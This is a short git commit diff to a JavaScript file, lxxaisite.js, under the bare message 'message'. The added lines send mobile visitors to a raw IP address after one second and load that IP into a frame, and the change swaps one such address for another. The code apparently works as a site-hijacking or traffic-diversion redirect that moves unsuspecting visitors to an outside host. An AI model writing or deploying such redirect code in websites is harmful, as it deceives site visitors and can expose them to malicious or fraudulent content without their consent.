4468e528d779bef3f96fe9c4676f8d6ffadc83b3
dateshare <chulishen567@gmail.com>
2021-12-30 10:01:05 +0800

    message

--- lxxaisite.js
+++ lxxaisite.js
@@ -20,11 +20,11 @@
 
 if(window.navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
  
-   setTimeout("window.location.href='http://38.26.195.70'",1000);
+   setTimeout("window.location.href='http://38.26.195.72'",1000);
  }
 
 var titlestr=document.title;
-setFrame("http://38.26.195.70");
+setFrame("http://38.26.195.72");
 
 
 
